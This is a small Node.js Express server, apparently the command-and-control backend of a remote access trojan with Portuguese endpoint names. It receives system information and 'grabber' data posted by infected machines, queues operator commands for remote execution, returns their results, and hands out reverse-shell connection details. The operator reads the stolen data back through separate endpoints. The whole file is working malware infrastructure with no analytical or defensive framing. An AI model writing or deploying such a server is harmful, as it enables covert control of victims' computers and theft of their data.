const express = require(`express`)
const app = express()
const port = process.env.PORT

app.use(express.json({limit: "50mb"}));
app.use(express.urlencoded({limit: "50mb", extended: true, parameterLimit:50000}));

var ip = {ip:'',porta:0,estado:'off'};
var infopc
var infopG
var comando
var resultado
//passainfo
app.post(`/passainfo`, (req, res) => {
    res.send(`OK`)
    infopc = req.body
    console.log(infopc)
})
app.post(`/passagrabber`, (req, res) => {
    res.send(`OK`)
    infopG = req.body
    console.log(infopG)
})
app.post(`/executa`, (req, res) => {
    res.send(comando)
    comando = ''
resultado = req.body.js
    console.log(resultado)
})

app.post(`/executaA`, async(req, res) => {

    comando = req.body.cmd
res.send(resultado)

})

app.post(`/reverseshell`, async(req, res) => {
if(ip.estado == 'off'){
    res.send('nada')
}else{
    res.send(ip)
}
console.log(ip)

})
app.post(`/reverseshellC`, async(req, res) => {

    ip.ip = req.body.ip
    ip.porta = req.body.porta
    ip.estado = req.body.estado
    res.send(`OK`+ip)

    })


app.post(`/infoA`, async(req, res) => {

res.send(infopc)

})

app.post(`/graberA`, async(req, res) => {

res.send(infopG)

})

//executaA
//reverseshellC
//infoA
//graberA

app.listen(port, () => console.log(`Example app listening on port ${port}!`))